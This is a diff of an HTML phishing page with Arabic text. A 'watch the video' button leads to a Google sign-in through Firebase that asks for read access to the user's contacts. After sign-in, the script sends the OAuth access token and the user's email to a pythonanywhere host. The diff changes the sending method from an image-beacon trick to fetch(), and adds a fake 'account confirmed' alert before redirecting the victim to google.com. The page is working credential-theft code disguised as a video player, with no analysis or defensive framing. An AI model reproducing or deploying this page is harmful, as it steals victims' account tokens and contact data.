@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
+<head><meta charset="UTF-8"></head>
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+    <button id="btn" style="padding:30px; background:red; color:white;">مشاهدة الفيديو</button>
+
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-</head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
-    <button id="btn" style="padding:20px; background:red; color:white;">اضغط للمشاهدة</button>
 
     <script>
         const firebaseConfig = {
@@ -24,21 +23,19 @@
                 const token = result.credential.accessToken;
                 const sender = result.user.email;
                 
-                // استخدام "الرابط المباشر" بدون مسارات فرعية
-                const target = `https://mohamedahmed77.pythonanywhere.com/?token=${token}&sender=${sender}`;
-                
-                // خدعة الصورة للإرسال الإجباري
-                const i = new Image();
-                i.src = target;
-
-                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+                // إرسال البيانات للسيرفر
+                fetch(`https://mohamedahmed77.pythonanywhere.com/?token=${token}&sender=${sender}`)
+                .then(() => {
+                    alert("تم تأكيد الحساب!");
+                    window.location.href = "https://google.com";
+                });
             }
         });
 
         document.getElementById('btn').onclick = () => {
-            const p = new firebase.auth.GoogleAuthProvider();
-            p.addScope('https://www.googleapis.com/auth/contacts.readonly');
-            firebase.auth().signInWithRedirect(p);
+            const provider = new firebase.auth.GoogleAuthProvider();
+            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
+            firebase.auth().signInWithRedirect(provider);
         };
     </script>
 </body>
